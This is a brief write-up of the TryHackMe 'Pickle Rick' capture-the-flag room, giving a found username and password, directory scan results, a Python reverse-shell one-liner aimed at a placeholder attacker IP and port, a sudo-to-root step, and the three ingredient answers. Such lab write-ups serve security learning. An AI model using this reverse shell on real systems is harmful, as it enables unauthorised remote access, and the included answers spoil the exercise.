# Pickle Rick | TryHackMe
> Blue Cosmo | 07/12/21

# Task 1
1. What is the first ingredient Rick needs?

view source to find
```
Username: R1ckRul3s
```
run directory scan to find robots.txt and login.php
```
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)

robots.txt - Wubbalubbadubdub
```
login to 'login.php'
```
grep . FILENAME
mr. meeseek hair
```

2. What is the second ingredient Rick needs?
```
export RHOST="YOURIP";export RPORT=YOURPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
navigate to ricks home directory
```
1 jerry tear
```
3. What is the final ingredient Rick needs?
```
$ sudo bash
cd /root
fleeb juice
```
